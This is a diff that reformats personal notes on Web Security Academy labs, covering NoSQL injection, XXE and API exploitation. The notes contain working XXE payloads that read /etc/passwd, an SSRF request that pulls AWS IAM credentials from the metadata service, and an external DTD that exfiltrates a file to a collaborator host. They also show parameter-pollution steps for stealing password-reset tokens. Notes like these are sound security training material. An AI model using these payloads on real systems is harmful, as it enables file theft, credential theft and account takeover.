@@ -1311,7 +1311,7 @@ Types: synxtax (break the NoSQL query syntax), operator (manipulate queries)
    - enumerate the password
      intruder >  GET /user/lookup?user=`administrator' %26%26+this.password.length+%3d%3d+'§8§`
      cluster bomb | payload 1: 0-7 | payload 2: a-z
-4.  Exploiting NoSQL operator injection to **extract unknown fields**
+4. Exploiting NoSQL operator injection to **extract unknown fields**
    - Perform password reset for carlos function
    - identify if a **$where** clause is being evaluated
      - false > invalid username or password
@@ -1402,94 +1402,95 @@ Interfere with an application's processing of XML to view files on the applicati
 | **JavaScript (Node.js)** | xml2js             | ```parseStringPromise(data, { explicitArray: false });``` |
   
 ### XXE Injection Lab
-- Exploiting XXE using external entities to **retrieve files**
-  - Original: POST /product/stock
-  ```
-  <?xml version="1.0" encoding="UTF-8"?>
+1. Exploiting XXE using external entities to **retrieve files**
+   - Original: POST /product/stock
+   ```
+   <?xml version="1.0" encoding="UTF-8"?>
    <stockCheck>
      <productId>1</productId>
      <storeId>1</storeId>
-   </stockCheck>
-  ```
-  - Insert **external entity definition**   
-  ```
-  <!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+    </stockCheck>
+   ```
+   - Insert **external entity definition**   
+   ```
+   <!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
    <stockCheck>
      <productId>&xxe;</productId>
      <storeId>1</storeId>
    </stockCheck>
-  ```
-- Exploiting XXE to perform **SSRF attacks**   
-  `<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>`   
-  ```
-  Invalid product ID: {
-  "Code" : "Success",
-  "LastUpdated" : "2024-07-27T06:38:10.254304923Z",
-  "Type" : "AWS-HMAC",
-  "AccessKeyId" : "LXV3KdlXvSOWCyEXAvRZ",
-  "SecretAccessKey" : "LUN1SXrOIQwuNHqGBkybvvkXEE0YtdQWp0s09io9",
-  "Token" :    "DUz6RAWhqlG88IZPLdd0Ub5z5W2VVBFTpqonDCFCAZPd8AtRNQcJRQMyNnvKGLETEXVbqBxeuGt4OMXI87hkeYK5AWhOaRa5C1xKdviiTVMbn9LrtTktJGZOOdENDfqdgVZ31lloO8YcmDBUJmSjLntu7hWZxcpl9DkQpA6MVGPgPqzzfr78cNrZcTOCspN9z77CqHQhzrAEZVUOfCLfl4WpWnQiimURVkgNs1Yk36fgHBpFOVtAFiRdtUTW1TX4",
-  "Expiration" : "2030-07-26T06:38:10.254304923Z"
-   }
-  ```   
-- Exploiting **XInclude** to retrieve files
-  - use cases: 1) don't have control over the entire XML document, only a part of it 2) app returns the contents of an element we control
-  - Original: productId=2&storeId=1
-  - Modified: productId=`<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>`&storeId=1
-- Exploiting XXE via image **file upload**
-  - SVG workflow
-    - image upload? try a benign SVG file
-    - if it doesn't, can you bypass file validation?
-    - try to declare entities and exfil data in-band
-    - if entities work, but no in-band reflection, try out of band
-  - Post a comment and upload the SVG image > **create a local svg file**
    ```
-   <?xml version="1.0" standalone="yes"?>
-   <!DOCTYPE test [
+2. Exploiting XXE to perform **SSRF attacks**   
+   `<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>`   
+   ```
+   Invalid product ID: {
+   "Code" : "Success",
+   "LastUpdated" : "2024-07-27T06:38:10.254304923Z",
+   "Type" : "AWS-HMAC",
+   "AccessKeyId" : "LXV3KdlXvSOWCyEXAvRZ",
+   "SecretAccessKey" : "LUN1SXrOIQwuNHqGBkybvvkXEE0YtdQWp0s09io9",
+   "Token" :    
+ "DUz6RAWhqlG88IZPLdd0Ub5z5W2VVBFTpqonDCFCAZPd8AtRNQcJRQMyNnvKGLETEXVbqBxeuGt4OMXI87hkeYK5AWhOaRa5C1xKdviiTVMbn9LrtTktJGZOOdENDfqdgVZ31lloO8YcmDBUJmSjLntu7hWZxcpl9DkQpA6MVGPgPqzzfr78cNrZcTOCspN9z77CqHQhzrAEZVUOfCLfl4WpWnQiimURVkgNs1Yk36fgHBpFOVtAFiRdtUTW1TX4",
+   "Expiration" : "2030-07-26T06:38:10.254304923Z"
+   }
+   ```   
+3. Exploiting **XInclude** to retrieve files
+   - use cases: 1) don't have control over the entire XML document, only a part of it 2) app returns the contents of an element we control
+   - Original: productId=2&storeId=1
+   - Modified: productId=`<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>`&storeId=1
+4. Exploiting XXE via image **file upload**
+   - SVG workflow
+     - image upload? try a benign SVG file
+     - if it doesn't, can you bypass file validation?
+     - try to declare entities and exfil data in-band
+     - if entities work, but no in-band reflection, try out of band
+   - Post a comment and upload the SVG image > **create a local svg file**
+     ```
+     <?xml version="1.0" standalone="yes"?>
+     <!DOCTYPE test [
      <!ENTITY xxe SYSTEM "file:///etc/hostname">
-   ]>
-   <svg width="128px" height="128px"
+     ]>
+     <svg width="128px" height="128px"
         xmlns="http://www.w3.org/2000/svg"
         xmlns:xlink="http://www.w3.org/1999/xlink"
         version="1.1">
      <text font-size="16" x="0" y="16">&xxe;</text>
-   </svg>
-   ``` 
-- Blind XXE with out-of-band interaction   
- **xxe SYSTEM "http://burp"**   
-  `<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> ]>`
-- Blind XXE with out-of-band interaction via **XML parameter entities**    
-  **% xxe SYSTEM "http://burp"**   
-  `<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> %xxe; ]>`
-- Exploiting blind XXE to exfiltrate data using a **malicious external DTD**
+     </svg>
+     ``` 
+5. Blind XXE with out-of-band interaction   
+   **xxe SYSTEM "http://burp"**   
+   `<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> ]>`
+6. Blind XXE with out-of-band interaction via **XML parameter entities**    
+   **% xxe SYSTEM "http://burp"**   
+   `<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> %xxe; ]>`
+7. Exploiting blind XXE to exfiltrate data using a **malicious external DTD**
    - Go to exploit server > insert below malicious DTD > click store button   
      ```
      <!ENTITY % file SYSTEM "file:///etc/hostname">
       <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://6mtezovlmkll41l5iasruysosfy6mxjl8.oastify.com/?x=%file;'>">
       %eval;
       %exfil;
-      ```
+     ```
    - Check Stock repeater modify the body param   
      `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0ac8008703c35d7d8048bbea01cf0088.exploit-server.net/exploit"> %xxe;]>`
    - Collaborator Poll Now > GET /?x=**ddd7bfff53e5**   
-- Exploiting blind XXE to retrieve data via **error messages**
-  - Go to exploit server > insert below malicious DTD > click store button   
-    ```
-    <!ENTITY % file SYSTEM "file:///etc/passwd">
-    <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
+8. Exploiting blind XXE to retrieve data via **error messages**
+   - Go to exploit server > insert below malicious DTD > click store button   
+     ```
+     <!ENTITY % file SYSTEM "file:///etc/passwd">
+     <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
      %eval;
      %exfil;
-    ```
+     ```
   - Click "View exploit" > note the exploit URL
   - Check Stock repeater modify the body param   
     `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>`
-- Exploiting XXE to retrieve data by **repurposing a local DTD (Expert)**
-  - reference an existing DTD file on the server and redefine an entity from it
-  - /usr/share/yelp/dtd/docbookx.dtd ； entity: ISOamso
-  - Check Stock repeater modify the body param
-  - Redefine the ISOamso entity, triggering an error message 
-    ```
-    <!DOCTYPE message [
+9. Exploiting XXE to retrieve data by **repurposing a local DTD (Expert)**
+   - reference an existing DTD file on the server and redefine an entity from it
+   - /usr/share/yelp/dtd/docbookx.dtd ； entity: ISOamso
+   - Check Stock repeater modify the body param
+   - Redefine the ISOamso entity, triggering an error message 
+     ```
+     <!DOCTYPE message [
       <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
       <!ENTITY % ISOamso '
       <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
@@ -1499,7 +1500,7 @@ Interfere with an application's processing of XML to view files on the applicati
       '>
       %local_dtd;
       ]>
-    ```    
+     ```    
 ## API
 **Discovering API documentation**
 - /api
@@ -1535,53 +1536,51 @@ CONNECT
 - Graceful Error Handling and Logging
   
 ### API Lab
-- Exploiting an API endpoint using **documentation**
-  https://0a4b00aa036437a4808817f400bc0053.web-security-academy.net/`api`/
-- Exploiting **server-side parameter pollution** in a query string
-  - Test username
-    **POST /forgot-password** 
-    username=administrator > results   
-    username=invalid > Invalid username   
-  - Finding second param &x=y
-    username=administrator**%26x=y** > Error: Parameter is not supported   
-  - truncate the server-side query string using a URL-encoded #
-    username=administrator**%23** > Error: Field not specified   
-  - **Brute-force** the value of the **field parameter**
-    POST /forgot-password
-    username=administrator%26field=**§x§**%23
-    Payloads add from list > Server-side variable names
-    200 status: email, username   
-  - Engagement tools > Find scripts > review the /static/js/forgotPassword.js
-    **/forgot-password?reset_token**=${resetToken}   
-  - change the value of the **field parameter** from email to **reset_token**
-    POST /forgot-password
-    username=administrator`%26field=reset_token%23`
-    resend > retrieve token value   
-  - **GET /forgot-password** append the reset_token
-    GET /forgot-password?reset_token=[YOUR TOKEN]
-  - Reach change password page   
-- Finding and **exploiting an unused API** endpoint
-  - Discover endpoints
-    GET /api/products/1/price
-  - Identify supported http methods > GET, PATCH
-  - Extensions > Change **Content Type Converter** > Convert to JSON
-  - Update price
-    ```
-    PATCH /api/products/1/price
-    {"price":0}
-    ```
-- Exploiting a **mass assignment** vulnerability
-  - **Disover API endpoints**
+1. Exploiting an API endpoint using **documentation**
+   https://0a4b00aa036437a4808817f400bc0053.web-security-academy.net/`api`/
+2. Exploiting **server-side parameter pollution** in a query string
+   - Test username
+     **POST /forgot-password** 
+     username=administrator > results   
+     username=invalid > Invalid username   
+   - Finding second param &x=y
+     username=administrator**%26x=y** > Error: Parameter is not supported   
+   - truncate the server-side query string using a URL-encoded #
+     username=administrator**%23** > Error: Field not specified   
+   - **Brute-force** the value of the **field parameter**
+     POST /forgot-password
+     username=administrator%26field=**§x§**%23
+     Payloads add from list > Server-side variable names
+     200 status: email, username   
+   - Engagement tools > Find scripts > review the /static/js/forgotPassword.js
+     **/forgot-password?reset_token**=${resetToken}   
+   - change the value of the **field parameter** from email to **reset_token**
+     POST /forgot-password
+     username=administrator`%26field=reset_token%23`
+     resend > retrieve token value   
+   - **GET /forgot-password** append the reset_token
+     GET /forgot-password?reset_token=[YOUR TOKEN]
+   - Reach change password page   
+3. Finding and **exploiting an unused API** endpoint
+   - Discover endpoints
+     GET /api/products/1/price
+   - Identify supported http methods > GET, PATCH
+   - Extensions > Change **Content Type Converter** > Convert to JSON
+   - Update price
+     ```
+     PATCH /api/products/1/price
+     {"price":0}
+     ```
+4. Exploiting a **mass assignment** vulnerability
+   - **Disover API endpoints**
     - POST /api/checkout
     - POST /api/doc/Order
     - GET /api/doc/ChosenProduct
-  - **Change request method to GET** /api/checkout > send > discover "chosen_discount"
+   - **Change request method to GET** /api/checkout > send > discover "chosen_discount"
+     `{"chosen_discount":{"percentage":0},"chosen_products":[]}`
+  - in POST /api/checkout, append the "chosen_discount" properties and set percentage to 100
     ```
-    {"chosen_discount":{"percentage":0},"chosen_products":[]}
-    ```
-- in POST /api/checkout, append the "chosen_discount" properties and set percentage to 100
-  ```
-  {
+   {
     "chosen_discount":{
         "percentage":100
     },
@@ -1592,30 +1591,30 @@ CONNECT
         }
      ]
    }
-  ```
-- Exploiting **server-side parameter pollution** in a REST URL
-  - **Discover urls** > review /static/js/forgotPassword.js   
-    /forgot-password?**passwordResetToken**=${resetToken}
-  - Test the new url   
-    https://0a4d00e204437cd0804f0d9c00b7004e.web-security-academy.net/forgot-password?**passwordResetToken=123** > invalid token   
-  - Trial and Error **API routes**   
-    POST /forgot-password   
-    username=administrator > Results return   
-    username=administrator? > Error: Invalid route. Please refer to the API definiition.   
-  - try path travelsal techniques   
-    username=../administrator > Invalid route   
-    username=../../../../../administrator > Error: Unexpected response from API   
-    username=`/../../../../../openapi.json%23` > Error: **/api/internal/v1/users/{username}/field/{field}**   
-  - Test for **field name**   
-    username=administrator/field/invalid > The provided field name "invalid" does not exist   
-    username=administrator/field/passwordResetToken#   
-    Result: Error: **This version of API only** supports the email field for security reasons   
-  - Try **other version API**   
-    POST /forgot-password   
-    username=`../../v1/users/administrator/field/passwordResetToken%23`   
-    Result: 54iz54pjco7znfuihs9d9y4q13nilbm4   
-  - Access forgot password page of Admin   
-    https://0a4d00e204437cd0804f0d9c00b7004e.web-security-academy.net/forgot-password?passwordResetToken=[YOUR TOKEN]
+   ```
+5. Exploiting **server-side parameter pollution** in a REST URL
+   - **Discover urls** > review /static/js/forgotPassword.js   
+     /forgot-password?**passwordResetToken**=${resetToken}
+   - Test the new url   
+     https://0a4d00e204437cd0804f0d9c00b7004e.web-security-academy.net/forgot-password?**passwordResetToken=123** > invalid token   
+   - Trial and Error **API routes**   
+     POST /forgot-password   
+     username=administrator > Results return   
+     username=administrator? > Error: Invalid route. Please refer to the API definiition.   
+   - try path travelsal techniques   
+     username=../administrator > Invalid route   
+     username=../../../../../administrator > Error: Unexpected response from API   
+     username=`/../../../../../openapi.json%23` > Error: **/api/internal/v1/users/{username}/field/{field}**   
+   - Test for **field name**   
+     username=administrator/field/invalid > The provided field name "invalid" does not exist   
+     username=administrator/field/passwordResetToken#   
+     Result: Error: **This version of API only** supports the email field for security reasons   
+   - Try **other version API**   
+     POST /forgot-password   
+     username=`../../v1/users/administrator/field/passwordResetToken%23`   
+     Result: 54iz54pjco7znfuihs9d9y4q13nilbm4   
+   - Access forgot password page of Admin   
+     https://0a4d00e204437cd0804f0d9c00b7004e.web-security-academy.net/forgot-password?passwordResetToken=[YOUR TOKEN]
 
 ## Web cache deception
 - Web cache deception is a vulnerability that enables an attacker to trick a web cache into storing sensitive, dynamic content  
